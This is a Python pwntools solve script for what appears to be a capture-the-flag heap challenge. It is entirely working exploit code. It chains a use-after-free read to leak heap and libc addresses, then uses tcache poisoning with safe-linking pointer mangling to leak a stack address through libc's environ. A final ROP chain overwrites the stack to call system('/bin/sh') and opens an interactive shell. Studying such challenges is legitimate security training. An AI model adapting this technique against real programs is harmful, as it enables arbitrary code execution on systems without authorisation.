#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('chall_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''


        c
        ''')
        sleep(1)


if args.REMOTE:
    p = remote('')
else:
    p = process([exe.path])
GDB()

def create(idx, size, data):
    sna(b'> ', 1)
    sna(b'Index: ', idx)
    sna(b'Size: ', size)
    sa(b'Data: ', data)

def delete(idx):
    sna(b'> ', 2)
    sna(b'Index: ', idx)

def read(idx):
    sna(b'> ', 3)
    sna(b'Index: ', idx)

def edit(idx, data):
    sna(b'> ', 4)
    sna(b'Index: ', idx)
    sa(b'Data: ', data)

create(0, 20, b'aa')
delete(0)
read(0)

p.recvuntil(b'Data: ')

heap = u64(p.recv(5).ljust(8, b'\0') ) << 12
info(f'heap leak: {hex(heap)}')

for i in range(9):
    create(i, 0x90, b'ehee')
create(1, 100, b'jhaha')

for i in range(9):
    delete(i)
read(8)

p.recvuntil(b'Data: ')
libc_leak = u64(p.recv(6) + b'\0\0')
libc.address = libc_leak - 0x1e7bb0
info(f'libc leak: {hex(libc_leak)}')
info(f'libc base: {hex(libc.address)}')

def protect(ptr1, ptr2):
    return ( (ptr1 >> 12) ^ ptr2 )

evil = protect(heap +0x790, libc.sym.environ-8*3)
info(f'evil: {hex(evil)}')
edit(7, p64(evil))

create(0, 0x90, b'ehee')
create(0, 0x90, b'a'*24)
read(0)

p.recvuntil(b'a'*24)
stack = u64(p.recv(6) + b'\0\0')
rbp = stack - 0x158
info(f'stack leak: {hex(stack)}')
create(0, 0x200, b'A')
create(1, 0x200, b'A')
create(2, 0x200, b'A')

for i in range(3):
    delete(i)

evil2 = p64(protect(heap +0xd60, rbp))
edit(2, evil2)

create(0, 0x200, b'A')
input()
pop_rdi = 0x0000000000102dea + libc.address
load = flat(
    0xdeadbeef,
    pop_rdi+1,
    pop_rdi,
    next(libc.search(b'/bin/sh')),
    libc.sym.system
)

create(0, 0x200, load)

p.interactive()
